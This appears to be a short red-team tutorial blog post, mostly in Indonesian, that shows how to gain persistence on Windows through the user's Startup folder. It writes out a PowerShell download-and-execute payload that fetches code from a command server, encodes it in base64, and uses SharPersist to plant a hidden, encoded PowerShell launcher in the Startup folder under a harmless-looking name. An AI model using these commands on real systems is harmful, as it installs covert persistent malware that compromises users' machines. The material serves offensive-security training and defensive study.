---
title: 'Persistence via Startup Folder'
date: 2023-07-26 09:25:22 +0700
categories: ['Windows Hacking', 'Windows Persistence']
tags: [red team, Persistence, windows hacking, windows Persistence, startup]     # TAG names should always be lowercase
author: nairpaa
---

Aplikasi, file dan *shortcut* yang berada di dalam folder *startup* akan dijalankan secara otomatis ketika pengguna *login* ke komputer tersebut.

Biasanya fitur ini digunakan untuk mem-*bootstrap* *home environment* pengguna, seperti mengatur wallpaper, *shortcut*, dll. 

## 0x1 - Exploitation Stages

### Step 1: Creating a PowerShell Payload

Di PowerShell:

```powershell
# Menyimpan payload pada variable
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://teamserver.com/a"))'

# Konversi payload ke base64
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

Di Linux:

```bash
# Menyimpan payload pada variable
➜ set str 'IEX ((new-object net.webclient).downloadstring("http://teamserver.com/a"))'

# Konversi payload ke base64
➜ echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

### Step 2: Add Malware to Folder Startup

```powershell
PS > .\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64_payload>" -f "UserEnvSetup" -m add
```

Keterangan:
- `-f`: Nama file yang akan disimpan.

Kita bisa mengakses folder *startup* pengguna pada direktori berikut:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```

![Startup Folder](/assets/img/posts/windows-persistence-startup-folder/1.png)
_Startup Folder_

---

## 0x2 - References

- https://github.com/mandiant/SharPersist
- https://azeria-labs.com/persistence/
